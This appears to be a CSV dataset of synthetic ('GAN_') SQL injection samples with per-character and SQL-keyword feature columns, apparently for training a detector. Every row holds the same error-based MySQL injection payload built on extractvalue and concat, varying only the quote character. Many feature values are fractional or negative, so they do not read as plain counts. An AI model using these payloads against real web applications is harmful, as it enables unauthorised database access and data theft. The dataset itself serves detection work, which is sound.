id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000130,4.122235643269966,147.45729064941406,44.196842193603516,25.799222946166992,53.901206970214844,-0.2660861611366272,49.49028396606445,19.161691665649414,0.8065947890281677,0.3109360933303833,0.20198562741279602,0.3724342882633209,0.11404877156019211,3.7981250286102295,0.6723749041557312,0.6787571907043457,0.5741848945617676,0.19881027936935425,0.34170594811439514,0.04880861937999725,5.109152793884277,5.258440971374512,3.338167190551758,0.07859525829553604,0.9865543246269226,0.23930220305919647,0.02287159487605095,0.138315349817276,0.18710796535015106,0.007272826973348856,0.29168757796287537,-0.19896353781223297,2.4261887073516846,-0.2405186891555786,0.4592989385128021,1.2238627672195435,3.911848783493042,0.6366742849349976,1.2032421827316284,0.027994919568300247,0.1415850818157196,0.32449448108673096,0.024868611246347427,0.24589599668979645,0.0792681872844696,-0.10697094351053238,0.3074105978012085,0.23196449875831604,0.31873199343681335,0.3843306601047516,0.16179539263248444,0.1639156937599182,0.17117764055728912,-0.13798120617866516,-0.21360675990581512,0.08240076899528503,0.056207939982414246,0.12377897650003433,-0.2573498785495758,0.3489781320095062,0.006080098450183868,-0.010859761387109756,-0.0034622475504875183,0.08459790050983429,0.44824573397636414,0.018534600734710693,0.5542413592338562,0.14031736552715302,-0.19069167971611023,-0.04681774228811264,0.07822687923908234,-0.11449968814849854,-0.007355529814958572,-0.25757622718811035,0.01641315408051014,-0.0020597665570676327,0.7515426278114319,0.2845287621021271,0.07945719361305237,0.09139730781316757,-0.03523949533700943,4.917537689208984,0.3806037902832031,0.07105079293251038,0.19293524324893951,0.9187994003295898,0.12749925255775452,-0.06107579916715622,0.2421434223651886
GAN_000012,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.7056516999984206,147.8292236328125,46.61029815673828,25.441011428833008,53.986507415771484,0.6395508646965027,46.582218170166016,19.254451751708984,1.224348545074463,0.30498605966567993,0.19259122014045715,0.36621010303497314,0.11390992254018784,3.7532122135162354,0.8072971701622009,0.4462999701499939,0.6107316017150879,0.14118066430091858,0.24220216274261475,-0.03581136092543602,5.090789318084717,5.149599552154541,3.7694406509399414,0.1435256004333496,0.9941275715827942,0.0018849913030862808,-0.058957718312740326,0.18181222677230835,-0.1755634844303131,-0.0020304019562900066,0.21972885727882385,0.15835946798324585,2.294419765472412,-0.03581704571843147,0.5211449861526489,1.1109710931777954,3.933790922164917,0.32573989033699036,1.0516482591629028,0.060470547527074814,0.1393219530582428,0.41079846024513245,-0.057423315942287445,0.15030162036418915,0.021485328674316406,-0.00905638188123703,0.054819896817207336,0.10099700093269348,0.2398594468832016,0.28129610419273376,-0.038639917969703674,0.2310733199119568,0.039766229689121246,-0.10434559732675552,-0.009059218689799309,-0.12672218680381775,0.038038596510887146,0.04489157348871231,0.12347230315208435,0.3694739043712616,-0.06228785961866379,0.20378609001636505,0.1705913245677948,0.04472268000245094,0.41066980361938477,0.2221457064151764,0.6769976019859314,-0.1501699537038803,-0.1532246470451355,-0.17950019240379333,-0.056267328560352325,-0.19008809328079224,-0.20550242066383362,-0.12159121036529541,0.011572972871363163,0.012430323287844658,0.7689838409423828,0.3198937475681305,-0.01833166927099228,0.006744861137121916,-0.0027296245098114014,5.02130126953125,0.4040025472640991,0.2624708414077759,0.16165651381015778,0.8268840312957764,-0.12593600153923035,0.13835011422634125,0.0510316863656044
GAN_000013,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.9833344218834115,148.6151580810547,44.224552154541016,25.209218978881836,54.05545425415039,0.6431838870048523,50.53914260864258,19.14104461669922,0.8423839807510376,0.3106662631034851,0.18853789567947388,0.3661409020423889,0.11854768544435501,3.7983388900756836,0.6091808080673218,0.3600815534591675,0.3922874331474304,0.08532670885324478,0.3000585734844208,0.07378052920103073,4.846482276916504,5.260990142822266,3.462681293487549,0.2517593801021576,1.0103050470352173,0.06463204324245453,-0.23917938768863678,0.04352150857448578,-0.13299016654491425,0.0034941774792969227,0.27994903922080994,0.02422567456960678,2.241626262664795,-0.16438354551792145,0.5030927658081055,0.9985025525093079,4.021700382232666,0.35867875814437866,1.0654406547546387,0.09499745070934296,0.08535916358232498,0.4618000090122223,-0.13539710640907288,0.1920003443956375,0.004913792014122009,0.12751129269599915,0.16448290646076202,0.16120843589305878,0.255436509847641,0.30167195200920105,0.12115445733070374,0.19956378638744354,0.005746424198150635,-0.2350751757621765,-0.15736383199691772,-0.13434165716171265,-0.18546733260154724,0.10541508346796036,0.07501403987407684,0.2847222089767456,-0.1496158242225647,0.28666579723358154,0.044704072177410126,-0.013064069673418999,0.389667272567749,0.03459847718477249,0.4873162806034088,0.260082483291626,-0.04374872148036957,-0.1393488049507141,-0.09621299058198929,0.004775594919919968,-0.038401298224925995,-0.05454418063163757,0.013056748546659946,0.0035590804181993008,0.6735291481018066,0.20390893518924713,0.2343459278345108,0.05548251420259476,-0.010382227599620819,5.124653339385986,0.47694849967956543,0.07123985886573792,0.09484243392944336,0.826924741268158,0.05452946200966835,0.31521371006965637,0.12721222639083862
GAN_000014,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.7009194012162534,148.2762908935547,46.139976501464844,26.151920318603516,54.25947570800781,0.27757567167282104,46.78834915161133,18.578033447265625,1.034590721130371,0.3161751627922058,0.18938395380973816,0.36972320079803467,0.11817841231822968,3.7774393558502197,0.741509199142456,0.5304194092750549,0.6217933893203735,0.1348230391740799,0.3003101050853729,0.055156879127025604,4.826621055603027,5.186580657958984,3.4848484992980957,0.14349237084388733,1.0931512117385864,-0.012539079412817955,-0.07480787485837936,0.1764419823884964,-0.04403810203075409,0.007610039785504341,0.22245648503303528,0.04536517709493637,1.9941143989562988,-0.09679363667964935,0.46964961290359497,1.0798519849777222,3.8966286182403564,0.4261232614517212,1.0637543201446533,0.1288403570652008,0.03728102147579193,0.44836723804473877,-0.029467910528182983,0.19771088659763336,-0.1241433247923851,0.06745664775371552,-0.03656024485826492,0.21175308525562286,0.19260281324386597,0.21268709003925323,0.11286170780658722,0.24841968715190887,-0.052440255880355835,-0.041882045567035675,-0.10996734350919724,-0.02768024057149887,-0.023846600204706192,0.11563866585493088,-0.02162371575832367,0.1640777587890625,-0.06401017308235168,0.010065451264381409,0.019488036632537842,0.04070490971207619,0.3794063329696655,-0.007641661912202835,0.6074610352516174,0.04934130609035492,-0.09749796986579895,-0.005499638617038727,0.13610748946666718,-0.019763337448239326,-0.07383283972740173,0.028025716543197632,0.015767596662044525,0.012820735573768616,0.7365269660949707,0.2760215401649475,0.13160821795463562,0.039435938000679016,0.033582653850317,5.043900012969971,0.3341429531574249,0.07597452402114868,0.16041509807109833,0.8164605498313904,-0.03442905843257904,0.0902930349111557,-0.13771653175354004
GAN_000015,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.8075505306919717,148.067626953125,46.76888656616211,24.839197158813477,53.243896484375,0.8315779566764832,46.918060302734375,19.2901554107666,0.948028564453125,0.32228949666023254,0.19353559613227844,0.3686556816101074,0.11884419620037079,3.7798750400543213,0.853239119052887,0.246858611702919,0.47224628925323486,0.13001088798046112,0.27524861693382263,0.12525959312915802,4.977428436279297,5.033375263214111,3.550635576248169,0.1316857635974884,1.0464659929275513,0.033933453261852264,-0.022034823894500732,0.19611762464046478,-0.19502615928649902,0.0052461219020187855,0.14381644129753113,-0.03365994989871979,2.110677480697632,-0.09349733591079712,0.4822361171245575,1.173783302307129,3.881021022796631,0.4911326467990875,1.17491614818573,0.06056083366274834,0.13364450633525848,0.4812849164009094,0.08366125077009201,0.19178073108196259,-0.008021950721740723,0.15112841129302979,0.0312613844871521,0.22003832459449768,0.17133133113384247,0.25781500339508057,0.14189688861370087,0.2658451497554779,-0.033435143530368805,-0.08804462105035782,0.04596751183271408,-0.1411248743534088,-0.16653160750865936,-0.014252493157982826,0.005313940346240997,0.35135239362716675,-0.07313056290149689,0.04260306805372238,-0.032856285572052,0.18739937245845795,0.4228748679161072,0.08466222137212753,0.5845992565155029,0.12127761542797089,-0.12279298156499863,-0.21604663133621216,0.11382267624139786,-0.09303172677755356,-0.022746004164218903,-0.06811998784542084,0.005997148342430592,0.005055245943367481,0.6576133966445923,0.21267028152942657,0.02724374085664749,0.01995864138007164,0.01438172161579132,5.217753887176514,0.3744777739048004,0.1106184870004654,0.1760936975479126,0.858784556388855,-0.09406764060258865,0.030341248959302902,0.031198568642139435
GAN_000016,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.8822907054724727,147.49990844726562,45.07402038574219,24.727548599243164,53.1739616394043,1.805956482887268,48.91190719604492,18.844528198242188,0.8467532396316528,0.30845674872398376,0.190917506814003,0.36674514412879944,0.11940805613994598,3.7926571369171143,0.665272057056427,0.37883085012435913,0.36930015683174133,0.0993666872382164,0.30206483602523804,-0.090333953499794,4.897805213928223,5.200790882110596,3.108165740966797,0.16206806898117065,1.0696210861206055,0.13314205408096313,-0.09860914200544357,0.14000843465328217,-0.10707758367061615,0.021586425602436066,0.20742762088775635,-0.1269448846578598,2.158034086227417,-0.15588924288749695,0.4285312592983246,1.165472388267517,3.9552853107452393,0.32446053624153137,1.0539463758468628,-0.050925277173519135,0.13329076766967773,0.5043900012969971,-0.017736822366714478,0.17920324206352234,0.06887166202068329,0.1148320809006691,0.045547887682914734,0.19653171300888062,0.22830763459205627,0.2955198884010315,0.1427842378616333,0.2085500955581665,0.018151555210351944,0.036747045814991,0.12866432964801788,-0.10830240696668625,-0.25287148356437683,-0.08448413014411926,0.020502015948295593,0.346495658159256,0.020089276134967804,0.07948508858680725,0.025871992111206055,0.06511150300502777,0.375245600938797,0.10240346938371658,0.5032508373260498,0.17204181849956512,-0.08181558549404144,-0.11880654841661453,-0.07791299372911453,0.012566953897476196,0.01986629329621792,-0.06424093246459961,0.010533577762544155,0.0030884146690368652,0.7121605277061462,0.2051849365234375,0.015338249504566193,0.030468374490737915,0.18055365979671478,5.318975925445557,0.4357983469963074,0.0906669944524765,0.21955522894859314,0.8184342384338379,-0.020415954291820526,0.22734111547470093,0.18618953227996826
GAN_000017,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.6794597149347417,148.9524688720703,46.71318817138672,26.992223739624023,54.09794616699219,0.9703670740127563,45.535301208496094,18.367403030395508,1.0922117233276367,0.3060223460197449,0.18311670422554016,0.3715834617614746,0.11790891736745834,3.76477313041687,0.8479915857315063,0.6178187727928162,0.7549055218696594,0.14444148540496826,0.3469321131706238,-0.04129491001367569,4.781427383422852,5.20095682144165,3.5543782711029053,0.1292833685874939,1.0386652946472168,0.014970295131206512,-0.016370536759495735,0.19722424447536469,0.13992081582546234,0.00994485430419445,0.21426093578338623,0.09376158565282822,2.0759575366973877,0.04402638226747513,0.4744281470775604,1.0578439235687256,3.879502296447754,0.43622636795043945,1.0459413528442383,-0.05233503878116608,0.06490208953619003,0.4333469867706299,-0.047755248844623566,0.18355095386505127,-0.2661643624305725,0.009130395948886871,-0.09277857095003128,0.2285035401582718,0.2049722522497177,0.18760313093662262,0.13552722334861755,0.27834683656692505,-0.10775676369667053,0.03132980316877365,-0.09926725924015045,0.07111704349517822,0.03160587698221207,0.22750845551490784,-0.052759334444999695,-0.002290874719619751,-0.11669901013374329,0.11900269985198975,-0.0016175732016563416,0.045515675097703934,0.36528539657592773,-0.08374381065368652,0.6276395320892334,-0.05303628370165825,0.01593390852212906,0.018058165907859802,0.06533204019069672,-0.14951711893081665,-0.1303805410861969,0.06740094721317291,0.017877230420708656,0.017839889973402023,0.7524442672729492,0.2021963745355606,0.13943374156951904,0.013340271078050137,-0.05161681026220322,5.054593563079834,0.30835580825805664,0.0605878122150898,0.14391539990901947,0.8218382000923157,0.037311214953660965,0.06474941968917847,-0.11340583860874176
GAN_000018,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.7663439171926782,148.2327117919922,47.13758850097656,24.134883880615234,53.59928512573242,0.1831102818250656,46.33367156982422,18.84099578857422,0.86481112241745,0.29758310317993164,0.1924942582845688,0.3667874336242676,0.11672389507293701,3.78668212890625,0.8096309900283813,0.7134551405906677,0.5488206744194031,0.08528026938438416,0.3461993932723999,0.06729148328304291,4.736810684204102,5.277028560638428,3.568587303161621,0.022698096930980682,1.0536651611328125,-0.03286341577768326,-0.15035584568977356,0.1034056544303894,0.046494532376527786,0.010189554654061794,0.1999204158782959,0.04758989065885544,2.2006711959838867,0.025045540183782578,0.5207754969596863,0.9518211483955383,3.8535966873168945,0.46472054719924927,1.0153359174728394,-0.026266075670719147,0.03618045896291733,0.4574846625328064,-0.20225459337234497,0.22587324678897858,-0.1656356155872345,-0.05197439342737198,0.16359339654445648,0.1997641623020172,0.20243312418460846,0.26229435205459595,0.10203185677528381,0.2569982409477234,0.03961212560534477,-0.017137032002210617,-0.12415177375078201,-0.021764136850833893,-0.0447600819170475,0.060906343162059784,0.15618334710597992,0.18391838669776917,-0.10106637328863144,0.0788634717464447,0.017144732177257538,0.05349553003907204,0.3326750099658966,-0.07184308767318726,0.5902504920959473,0.12428250908851624,0.038335494697093964,0.09903276711702347,0.004271641373634338,-0.11541534960269928,0.01916184462606907,0.09654352813959122,0.01542320754379034,0.004004726652055979,0.8831841349601746,0.2525063157081604,-0.05833892524242401,-0.013722707517445087,0.21206793189048767,4.794899940490723,0.4222443699836731,0.14867189526557922,0.18248571455478668,0.8222949504852295,0.1162557303905487,0.12600642442703247,-0.008413143455982208
GAN_000019,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.906866166224258,147.32626342773438,46.684165954589844,23.85356330871582,54.1032829284668,0.028502391651272774,47.136417388916016,19.13882064819336,1.0065803527832031,0.3174494802951813,0.18296389281749725,0.36621737480163574,0.11796041578054428,3.7735698223114014,0.867469072341919,0.6100533604621887,0.5733081102371216,0.07825485616922379,0.35251402854919434,0.01419709250330925,5.055947780609131,5.126380920410156,3.7181859016418457,0.15826740860939026,1.0051684379577637,-0.10482978820800781,-0.05646025016903877,0.06270253658294678,-0.24865315854549408,0.012760418467223644,0.19432875514030457,0.125296950340271,2.0660862922668457,-0.16952648758888245,0.5332220792770386,1.0810632705688477,3.886207103729248,0.2921334207057953,1.1104462146759033,0.07872915267944336,0.11735183000564575,0.42239007353782654,-0.13955911993980408,0.172292098402977,-0.05470472201704979,0.16952434182167053,-0.0165041983127594,0.16710183024406433,0.1638556718826294,0.2667360007762909,0.016709312796592712,0.30701544880867004,-0.011009670794010162,0.015495061874389648,0.025528913363814354,-0.35036587715148926,-0.15582406520843506,-0.12618590891361237,0.23115582764148712,0.3967989683151245,0.026309974491596222,0.1716541051864624,-0.01282145082950592,0.05829549953341484,0.3905935287475586,0.17505165934562683,0.5671663284301758,0.14405907690525055,-0.17040415108203888,-0.0931633934378624,-0.009449638426303864,-0.0037174802273511887,-0.06225837022066116,-0.0039685070514678955,0.02162408083677292,0.006379575468599796,0.7557463049888611,0.24797964096069336,0.04341643676161766,-0.025983545929193497,0.008861914277076721,4.989837646484375,0.42605477571487427,0.07935541123151779,0.17261363565921783,0.8758376836776733,-0.07033924758434296,0.34147581458091736,0.03424622863531113
GAN_000020,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.920312379026023,148.42027282714844,44.53057861328125,26.21462059020996,52.36531448364258,0.3247712254524231,49.46305465698242,19.857349395751953,1.2318425178527832,0.2760566174983978,0.19759900867938995,0.36788398027420044,0.11585003137588501,3.738006830215454,0.812768280506134,0.406829833984375,0.5230438709259033,0.1739293783903122,0.21055437624454498,-0.2112158089876175,4.711394309997559,5.131481170654297,2.36531662940979,0.22543737292289734,1.028625249862671,-0.07101231813430786,-0.31291165947914124,0.226368248462677,-0.21978802978992462,-0.015721561387181282,0.37138688564300537,0.3494921922683716,2.0627076625823975,0.15781515836715698,0.5099802613258362,1.054652452468872,3.752615451812744,0.12324865162372589,0.9219359755516052,0.19170163571834564,0.030914073809981346,0.40106844902038574,-0.2027435600757599,0.1373697966337204,-0.0877324640750885,0.1955910623073578,-0.00028071552515029907,0.12938086688518524,0.12540747225284576,0.13036122918128967,-0.020777031779289246,0.34571999311447144,-0.33342090249061584,-0.1040581613779068,-0.05917525291442871,0.04230397939682007,-0.2384989708662033,0.4798271358013153,0.026102572679519653,0.11368747055530548,-0.09614957123994827,0.41696345806121826,0.07603248953819275,0.2553807497024536,0.5303025841712952,0.12497853487730026,0.7428823709487915,-0.11878486722707748,-0.2514095604419708,-0.3745780885219574,0.14231741428375244,-0.22787944972515106,-0.23400157690048218,0.06295965611934662,-0.0006941692554391921,0.040124475955963135,0.7027208805084229,0.17664378881454468,0.07321225106716156,0.009446664713323116,-0.048489637672901154,4.651798248291016,0.3851867914199829,0.248304545879364,0.028056588023900986,0.8419521450996399,-0.16029830276966095,0.12518437206745148,-0.2750524878501892
GAN_000021,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.6401211822232664,147.93138122558594,45.904048919677734,26.36665916442871,53.95564270019531,1.8752288818359375,46.80595016479492,19.1457576751709,1.1942334175109863,0.29776445031166077,0.19089069962501526,0.3684975206851959,0.11632195115089417,3.7428700923919678,0.6597708463668823,0.4954519271850586,0.7104603052139282,0.15231280028820038,0.24786823987960815,-0.04803232103586197,4.804481506347656,5.188882350921631,3.5500829219818115,0.27284231781959534,1.0286879539489746,0.06265220046043396,-0.12276823073625565,0.26285886764526367,-0.13701707124710083,-0.0018893625820055604,0.13523463904857635,0.23986658453941345,2.187429189682007,-0.020682979375123978,0.4779561460018158,1.1005293130874634,3.8901820182800293,0.23398463428020477,1.0109217166900635,0.02450552210211754,0.07063105702400208,0.4965493679046631,-0.031610652804374695,0.1376367062330246,0.014148347079753876,0.07375669479370117,-0.03070676326751709,0.15219493210315704,0.1930970698595047,0.18297414481639862,-0.0077260578982532024,0.2656394839286804,-0.08047635853290558,-0.004566609859466553,0.022374464198946953,0.023917585611343384,0.05681944265961647,0.24018451571464539,-0.0006090700626373291,0.06393168866634369,-0.00438535213470459,0.10103024542331696,-0.046495601534843445,0.04105554148554802,0.45593395829200745,0.1004481092095375,0.6657626032829285,-0.1482090950012207,-0.06789389252662659,-0.07021831721067429,0.0026613473892211914,-0.2787054777145386,-0.350931316614151,-0.09045414626598358,0.011518835090100765,0.026856916025280952,0.8187264800071716,0.24853403866291046,0.20663529634475708,0.012767712585628033,0.011415980756282806,5.127851486206055,0.34002578258514404,0.19229577481746674,0.08173627406358719,0.7958750128746033,-0.1659557819366455,0.1369570940732956,-0.1340339034795761
GAN_000022,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,3.900416466523917,147.2669219970703,45.840538024902344,25.920820236206055,53.52391815185547,0.9835264682769775,48.34632110595703,19.130815505981445,0.8592088222503662,0.30803370475769043,0.17857177555561066,0.36675214767456055,0.1173347607254982,3.786832094192505,0.8995015621185303,0.49298733472824097,0.5017049312591553,0.05787680670619011,0.29204222559928894,0.024359185248613358,4.984612941741943,5.184676647186279,3.875452756881714,0.18212801218032837,1.0202372074127197,0.0058025941252708435,-0.14064714312553406,0.13765841722488403,-0.20614852011203766,0.01638483814895153,0.11485480517148972,0.0048224180936813354,2.1285312175750732,-0.15787944197654724,0.47613638639450073,1.1669858694076538,3.9052772521972656,0.28407034277915955,1.0861265659332275,-0.06895428895950317,0.16241927444934845,0.5157260298728943,-0.006549648940563202,0.1729888617992401,0.05587306618690491,0.25440624356269836,-0.014679178595542908,0.24008546769618988,0.20713356137275696,0.29282712936401367,0.09732972085475922,0.3226364254951477,-0.06120428442955017,-0.028988905251026154,0.14391687512397766,-0.12482915073633194,-0.15390682220458984,0.012974396347999573,0.10368447005748749,0.36310702562332153,0.08732739835977554,0.30586671829223633,-0.11536511778831482,0.1524796187877655,0.35218966007232666,0.12784290313720703,0.4947812557220459,0.08797882497310638,-0.05690707266330719,-0.12755978107452393,-0.10453052073717117,-0.06513486802577972,-0.03390297293663025,-0.030603691935539246,0.008890255354344845,0.007159324828535318,0.7086431980133057,0.1849539875984192,0.09227894991636276,-0.01589002087712288,-0.03149347007274628,5.231691360473633,0.42868316173553467,0.18702155351638794,0.13712923228740692,0.8353441953659058,-0.131439670920372,0.3233359754085541,0.21210846304893494
GAN_000023,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000130,3.9621582910584148,147.2138671875,44.112754821777344,24.517072677612305,53.54119873046875,-0.01253135409206152,50.0220947265625,19.242910385131836,0.8149409294128418,0.29971107840538025,0.1943133920431137,0.37178272008895874,0.11562934517860413,3.765401601791382,0.5714969038963318,0.7156362533569336,0.4603598415851593,0.12280838191509247,0.2870294153690338,-0.17547017335891724,4.875987529754639,5.306589126586914,2.712625741958618,0.18738475441932678,1.1194556951522827,0.057146016508340836,-0.11361294984817505,0.12322083860635757,-0.06436246633529663,0.0046648248098790646,0.3116900622844696,0.17248398065567017,1.9995242357254028,-0.28058677911758423,0.45693910121917725,1.126615285873413,3.9323537349700928,0.4212456941604614,1.1024614572525024,0.197711780667305,0.05663226544857025,0.4619516134262085,-0.22541657090187073,0.23343662917613983,0.10582301020622253,0.010410204529762268,0.10666008293628693,0.17816583812236786,0.1491437405347824,0.2928053140640259,0.06232635676860809,0.23763923346996307,-0.09318605065345764,0.11143698543310165,-0.014465123414993286,-0.10558619350194931,-0.2274942547082901,0.17320320010185242,0.07216963171958923,0.25046244263648987,0.10985035449266434,0.17088298499584198,-0.08172568678855896,0.011078041046857834,0.49457284808158875,0.04505886882543564,0.6170111894607544,0.27809613943099976,-0.2854228913784027,-0.13914799690246582,0.10553956031799316,-0.024749809876084328,-0.040530793368816376,-0.07629157602787018,0.01703518070280552,0.010944739915430546,0.809917688369751,0.2591751515865326,0.1702529788017273,0.02485041879117489,0.06397385895252228,5.083077907562256,0.3931143581867218,0.02946031093597412,0.1506149023771286,0.8080027103424072,0.01200297474861145,0.17318680882453918,-0.024159252643585205
